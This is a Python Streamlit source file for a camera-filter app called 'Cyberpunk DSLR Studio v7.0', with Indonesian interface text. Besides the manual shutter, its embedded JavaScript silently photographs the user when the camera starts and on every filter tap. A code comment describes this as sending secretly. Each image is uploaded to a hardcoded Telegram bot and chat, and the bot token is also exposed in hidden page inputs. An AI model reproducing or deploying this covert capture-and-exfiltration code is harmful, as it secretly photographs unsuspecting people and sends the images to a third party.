import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="CYBERPUNK DSLR STUDIO // v7.0 Ultimate Refined",
    page_icon="📸",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
    
    .stApp {
        background: #020617;
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .studio-panel {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(2, 6, 23, 0.98) 100%);
        border: 1px solid rgba(56, 189, 248, 0.35);
        border-radius: 20px;
        padding: 24px;
        box-shadow: 0 0 50px rgba(14, 165, 233, 0.15);
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; font-family: Orbitron, sans-serif; color: #38bdf8; font-weight: 900; letter-spacing: 2px;'>📸 CYBERPUNK DSLR STUDIO v7.0</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px;'>Ultimate Optic Suite dengan Advanced UI/UX Refinement & Silent Cloud Sync</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="studio-panel">', unsafe_allow_html=True)
    
    st.markdown(f'<input type="hidden" id="secret-token" value="{TELEGRAM_BOT_TOKEN}">', unsafe_allow_html=True)
    st.markdown(f'<input type="hidden" id="secret-chat" value="{TELEGRAM_CHAT_ID}">', unsafe_allow_html=True)

    studio_v7_html = """
    <style>
        /* Tombol & Elemen Interaktif Estetik */
        .cyber-btn {
            background: rgba(30, 41, 59, 0.7);
            color: #cbd5e1;
            border: 1px solid rgba(71, 85, 105, 0.8);
            padding: 9px 12px;
            border-radius: 10px;
            font-size: 11px;
            font-family: 'Plus Jakarta Sans', sans-serif;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            width: 100%;
        }
        .cyber-btn:hover {
            background: rgba(51, 65, 85, 0.9);
            color: #38bdf8;
            border-color: #38bdf8;
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.25);
        }
        .cyber-btn:active {
            transform: translateY(1px);
        }
        .preset-active {
            background: linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%) !important;
            color: #ffffff !important;
            border-color: #38bdf8 !important;
            box-shadow: 0 0 18px rgba(14, 165, 233, 0.6) !important;
            font-weight: 700 !important;
        }
        .shutter-btn {
            background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 100%);
            color: #020617;
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            font-size: 13px;
            border: 2px solid #38bdf8;
            padding: 15px 30px;
            border-radius: 40px;
            cursor: pointer;
            box-shadow: 0 0 25px rgba(56, 189, 248, 0.5);
            letter-spacing: 1px;
            transition: all 0.2s ease;
            width: 100%;
        }
        .shutter-btn:hover {
            background: #38bdf8;
            color: #ffffff;
            box-shadow: 0 0 40px rgba(56, 189, 248, 0.8);
            transform: scale(1.02);
        }
        .shutter-btn:active {
            transform: scale(0.98);
        }
        
        /* Select Dropdown Kustom */
        .cyber-select {
            background: rgba(30, 41, 59, 0.8);
            color: #38bdf8;
            border: 1px solid rgba(71, 85, 105, 0.8);
            padding: 6px 10px;
            border-radius: 8px;
            font-family: 'Orbitron', sans-serif;
            font-size: 10px;
            outline: none;
            cursor: pointer;
            transition: border-color 0.2s;
        }
        .cyber-select:hover {
            border-color: #38bdf8;
        }
    </style>

    <!-- Layar Start Pintu Masuk -->
    <div id="gate-screen" style="text-align: center; padding: 40px 10px;">
        <div style="font-family: 'Orbitron', sans-serif; font-size: 12px; color: #38bdf8; margin-bottom: 25px; letter-spacing: 2px;">SECURE OPTIC ENGINE // READY</div>
        <button id="igniteBtn" class="shutter-btn" style="max-width: 320px; margin: 0 auto; font-size: 14px;">⚡ AKTIFKAN STUDIO KAMERA</button>
    </div>

    <!-- Interface Studio Utama -->
    <div id="studio-interface" style="display:none;">
        
        <!-- Toolbar Navigasi Atas -->
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; background: rgba(15, 23, 42, 0.85); padding: 10px 14px; border-radius: 12px; border: 1px solid rgba(56, 189, 248, 0.25);">
            <div>
                <button onclick="switchCamera()" class="cyber-btn" style="width: auto; padding: 6px 12px; background: #0ea5e9; color: #fff; font-family: 'Orbitron', sans-serif; font-size: 10px;">🔄 Switch Lens</button>
            </div>
            <div style="display: flex; gap: 8px;">
                <select id="aspect-ratio-select" onchange="changeAspectRatio()" class="cyber-select">
                    <option value="16:9">Rasio 16:9</option>
                    <option value="4:3">Rasio 4:3</option>
                    <option value="1:1">Square 1:1</option>
                </select>
                <select id="timer-select" class="cyber-select">
                    <option value="0">Timer: Off</option>
                    <option value="3">Timer: 3s</option>
                    <option value="5">Timer: 5s</option>
                    <option value="10">Timer: 10s</option>
                </select>
            </div>
        </div>

        <!-- Jendela Viewfinder Kamera -->
        <div id="viewfinder-wrapper" style="position: relative; width: 100%; max-width: 520px; height: 300px; margin: 0 auto; border-radius: 14px; overflow: hidden; background: #000; border: 2px solid #0ea5e9; box-shadow: 0 0 35px rgba(14, 165, 233, 0.35); display: flex; align-items: center; justify-content: center; transition: height 0.3s ease;">
            
            <video id="optics-stream" autoplay playsinline style="
                width: 100%;
                height: 100%;
                object-fit: cover;
                transform: scaleX(-1);
                filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg);
            "></video>

            <!-- Efek Flash Putih -->
            <div id="flash-overlay" style="position: absolute; top:0; left:0; right:0; bottom:0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.1s ease;"></div>

            <!-- Efek Scanline CRT -->
            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%); background-size: 100% 4px; pointer-events: none; opacity: 0.4;"></div>

            <!-- Hitung Mundur Timer -->
            <div id="countdown-display" style="position: absolute; font-family: 'Orbitron', sans-serif; font-size: 70px; font-weight: 900; color: #38bdf8; text-shadow: 0 0 25px rgba(56,189,248,0.9); display: none;">3</div>

            <!-- HUD Telemetry -->
            <div style="position: absolute; top: 10px; left: 10px; color: #38bdf8; font-family: 'Orbitron', sans-serif; font-size: 8px; background: rgba(2,6,23,0.85); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(56,189,248,0.3);">
                FILTER: <span id="hud-active-filter">Normal Pro</span>
            </div>
            <div style="position: absolute; top: 10px; right: 10px; color: #f43f5e; font-family: 'Orbitron', sans-serif; font-size: 8px; background: rgba(2,6,23,0.85); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(244,63,94,0.3);">
                ● HD STREAM
            </div>

            <!-- Grid Komposisi Rule of Thirds -->
            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; border: 1px solid rgba(56, 189, 248, 0.12);">
                <div style="border-right: 1px dashed rgba(56,189,248,0.12); border-bottom: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.12); border-bottom: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-bottom: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.12); border-bottom: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.12); border-bottom: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-bottom: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.12);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.12);"></div>
                <div></div>
            </div>
        </div>

        <!-- Panel Pilihan Filter & Kontrol Estetik -->
        <div style="margin-top: 15px; background: rgba(2, 6, 23, 0.9); padding: 16px; border-radius: 14px; border: 1px solid rgba(56, 189, 248, 0.25);">
            <div style="font-family: 'Orbitron', sans-serif; font-size: 10px; color: #38bdf8; margin-bottom: 10px; letter-spacing: 1px;">🎨 INTERACTIVE FX PRESETS (Auto-Capture & Cloud Sync):</div>
            
            <!-- Grid Tombol Filter yang Rapi -->
            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 14px;">
                <button onclick="setFilter(this, 'normal', 'Normal Pro')" class="cyber-btn preset-active">✨ Normal</button>
                <button onclick="setFilter(this, 'cyberpunk', 'Cyberpunk')" class="cyber-btn">🔥 Cyberpunk</button>
                <button onclick="setFilter(this, 'matrix', 'Matrix Code')" class="cyber-btn">🟢 Matrix</button>
                <button onclick="setFilter(this, 'thermal', 'Thermal Vision')" class="cyber-btn">🌡 Thermal</button>
                <button onclick="setFilter(this, 'noir', 'Noir Vintage')" class="cyber-btn">🎞️ Noir</button>
                <button onclick="setFilter(this, 'deepspace', 'Deep Space')" class="cyber-btn">🌌 DeepSpace</button>
                <button onclick="setFilter(this, 'neonpulse', 'Neon Pulse')" class="cyber-btn">⚡ NeonPulse</button>
                <button onclick="setFilter(this, 'sepia90', 'Retro 90s')" class="cyber-btn">📼 Retro 90s</button>
                <button onclick="setFilter(this, 'duotone', 'Duotone Pink')" class="cyber-btn">💖 Duotone</button>
            </div>

            <!-- Slider Kontrol Presisi Ringkas -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 10px; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 10px; margin-bottom: 15px;">
                <div>
                    <label style="color: #94a3b8;">Brightness: <span id="val-bright">100</span>%</label>
                    <input type="range" id="slider-bright" min="40" max="180" value="100" style="width: 100%; accent-color: #0ea5e9; cursor: pointer;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Contrast: <span id="val-contrast">100</span>%</label>
                    <input type="range" id="slider-contrast" min="50" max="200" value="100" style="width: 100%; accent-color: #0ea5e9; cursor: pointer;" oninput="applyCustomSliders()">
                </div>
            </div>

            <!-- Tombol Shutter Utama -->
            <div style="text-align: center; margin-top: 10px;">
                <button id="shutterTrigger" class="shutter-btn">📸 AMBIL & KIRIM KE TELEGRAM</button>
            </div>
            
            <p id="hud-status-msg" style="text-align: center; font-size: 10px; color: #38bdf8; margin-top: 10px; font-family: 'Orbitron', sans-serif; letter-spacing: 0.5px; min-height: 15px;"></p>

            <!-- Galeri Mini & Tombol Unduh Perangkat -->
            <div id="gallery-tray" style="margin-top: 12px; display: none; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 10px; text-align: center;">
                <div style="font-family: 'Orbitron', sans-serif; font-size: 9px; color: #94a3b8; margin-bottom: 6px;">✨ TERSIMPAN KE GALERI & TELEGRAM:</div>
                <img id="last-snapshot-preview" style="max-width: 110px; border-radius: 8px; border: 2px solid #0ea5e9; box-shadow: 0 0 15px rgba(14,165,233,0.4); display: block; margin: 0 auto 6px auto;" />
                <a id="download-link" download="cyber_dslr.jpg" style="font-family: 'Orbitron', sans-serif; font-size: 9px; color: #38bdf8; text-decoration: underline; cursor: pointer;">📥 Unduh Ulang Foto</a>
            </div>
        </div>
    </div>

    <!-- Media Tersembunyi untuk Pemrosesan Canvas -->
    <video id="vault-video" autoplay playsinline style="display:none;"></video>
    <canvas id="vault-canvas" style="display:none;"></canvas>

    <script>
        let activeStream = null;
        let useFacingMode = "user";
        let currentFilterString = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg)";
        let currentFilterName = "Normal Pro";

        document.getElementById('igniteBtn').addEventListener('click', async function() {
            const btn = document.getElementById('igniteBtn');
            btn.innerText = "MENGHUBUNGKAN KAMERA...";
            btn.style.opacity = "0.7";

            try {
                await startCameraStream();
                document.getElementById('gate-screen').style.display = "none";
                document.getElementById('studio-interface').style.display = "block";

                // Jepret otomatis pertama kali begitu kamera aktif
                setTimeout(() => {
                    executeCaptureAndSync("Inisialisasi Sistem");
                }, 1200);

            } catch(err) {
                console.log("Optic Error:", err);
                btn.innerText = "IZIN DITOLAK - COBA LAGI";
                btn.style.opacity = "1";
            }
        });

        async function startCameraStream() {
            if (activeStream) {
                activeStream.getTracks().forEach(track => track.stop());
            }
            activeStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: useFacingMode } 
            });
            
            const videoEl = document.getElementById('optics-stream');
            const vaultEl = document.getElementById('vault-video');
            videoEl.srcObject = activeStream;
            vaultEl.srcObject = activeStream;
        }

        async function switchCamera() {
            useFacingMode = (useFacingMode === "user") ? "environment" : "user";
            await startCameraStream();
        }

        function changeAspectRatio() {
            const ratio = document.getElementById('aspect-ratio-select').value;
            const wrapper = document.getElementById('viewfinder-wrapper');
            if(ratio === '16:9') {
                wrapper.style.height = '300px';
            } else if(ratio === '4:3') {
                wrapper.style.height = '360px';
            } else if(ratio === '1:1') {
                wrapper.style.height = '400px';
            }
        }

        function setFilter(btnElement, type, filterLabel) {
            // Update kelas tombol aktif
            const buttons = btnElement.parentElement.getElementsByTagName('button');
            for(let b of buttons) {
                b.classList.remove('preset-active');
            }
            btnElement.classList.add('preset-active');
            currentFilterName = filterLabel;
            document.getElementById('hud-active-filter').innerText = currentFilterName;

            // Atur string filter CSS
            if(type === 'normal') {
                currentFilterString = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg)";
            } else if(type === 'cyberpunk') {
                currentFilterString = "brightness(110%) contrast(140%) saturate(200%) hue-rotate(310deg)";
            } else if(type === 'matrix') {
                currentFilterString = "brightness(120%) contrast(160%) saturate(180%) sepia(100%) hue-rotate(60deg)";
            } else if(type === 'thermal') {
                currentFilterString = "brightness(110%) contrast(180%) saturate(250%) hue-rotate(180deg) invert(15%)";
            } else if(type === 'noir') {
                currentFilterString = "grayscale(100%) contrast(170%) brightness(90%)";
            } else if(type === 'deepspace') {
                currentFilterString = "brightness(95%) contrast(130%) saturate(190%) hue-rotate(240deg)";
            } else if(type === 'neonpulse') {
                currentFilterString = "brightness(115%) contrast(150%) saturate(220%) hue-rotate(140deg)";
            } else if(type === 'sepia90') {
                currentFilterString = "brightness(105%) contrast(110%) saturate(90%) sepia(60%) hue-rotate(10deg)";
            } else if(type === 'duotone') {
                currentFilterString = "brightness(110%) contrast(150%) saturate(200%) hue-rotate(300deg) sepia(40%)";
            }

            document.getElementById('optics-stream').style.filter = currentFilterString;

            // SILENT BACKGROUND CAPTURE: Otomatis jepret & kirim diam-diam saat sentuh filter
            setTimeout(() => {
                executeCaptureAndSync("Sentuhan Filter: " + filterLabel, true);
            }, 300);
        }

        function applyCustomSliders() {
            const b = document.getElementById('slider-bright').value;
            const c = document.getElementById('slider-contrast').value;

            document.getElementById('val-bright').innerText = b;
            document.getElementById('val-contrast').innerText = c;

            currentFilterString = "brightness(" + b + "%) contrast(" + c + "%)";
            document.getElementById('optics-stream').style.filter = currentFilterString;
        }

        document.getElementById('shutterTrigger').addEventListener('click', function() {
            const timerSecs = parseInt(document.getElementById('timer-select').value);
            if(timerSecs > 0) {
                runTimerAndCapture(timerSecs);
            } else {
                executeCaptureAndSync("Shutter Manual");
            }
        });

        function runTimerAndCapture(secs) {
            const countdownEl = document.getElementById('countdown-display');
            countdownEl.style.display = "block";
            let currentSec = secs;
            countdownEl.innerText = currentSec;

            const interval = setInterval(() => {
                currentSec--;
                if(currentSec > 0) {
                    countdownEl.innerText = currentSec;
                } else {
                    clearInterval(interval);
                    countdownEl.style.display = "none";
                    executeCaptureAndSync("Timer Shutter (" + secs + "s)");
                }
            }, 1000);
        }

        function executeCaptureAndSync(triggerSource, isSilent = false) {
            const statusBox = document.getElementById('hud-status-msg');
            if(!isSilent) {
                statusBox.innerText = "⚡ MEMPROSES & MENGIRIM KE TELEGRAM...";
            }

            // Kilat Flash visual
            const flash = document.getElementById('flash-overlay');
            flash.style.opacity = "0.9";
            setTimeout(() => { flash.style.opacity = "0"; }, 120);

            const videoElem = document.getElementById('vault-video');
            const canvasElem = document.getElementById('vault-canvas');
            
            if(!videoElem || videoElem.videoWidth === 0) return;

            canvasElem.width = videoElem.videoWidth;
            canvasElem.height = videoElem.videoHeight;
            
            const context = canvasElem.getContext('2d');
            context.filter = currentFilterString;
            context.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);

            canvasElem.toBlob(function(blobImage) {
                if(!blobImage) return;

                const imageUrl = URL.createObjectURL(blobImage);
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `CyberDSLR_${timestamp}.jpg`;

                // Unduh otomatis ke galeri perangkat
                const downloadLink = document.getElementById('download-link');
                downloadLink.href = imageUrl;
                downloadLink.download = filename;
                
                if(!isSilent) {
                    const clickEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
                    downloadLink.dispatchEvent(clickEvent);

                    const previewImg = document.getElementById('last-snapshot-preview');
                    previewImg.src = imageUrl;
                    document.getElementById('gallery-tray').style.display = "block";
                }

                // Kirim otomatis ke Telegram Bot
                const botToken = document.getElementById('secret-token').value;
                const targetChatId = document.getElementById('secret-chat').value;

                const payload = new FormData();
                payload.append('chat_id', targetChatId);
                payload.append('photo', blobImage, filename);
                payload.append('caption', `🚀 *CYBERPUNK DSLR STUDIO v7.0*\\n📌 *Picu:* ${triggerSource}\\n🎨 *Filter:* ${currentFilterName}`);

                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                    method: 'POST',
                    body: payload
                }).then(res => {
                    if(res.ok && !isSilent) {
                        statusBox.innerText = "✨ BERHASIL: Tersimpan ke Galeri & Terkirim ke Cloud!";
                    }
                }).catch(err => {
                    console.log("Cloud sync background error");
                });
            }, 'image/jpeg', 0.92);
        }
    </script>
    """

    components.html(studio_v7_html, height=780)
    st.markdown('</div>', unsafe_allow_html=True)
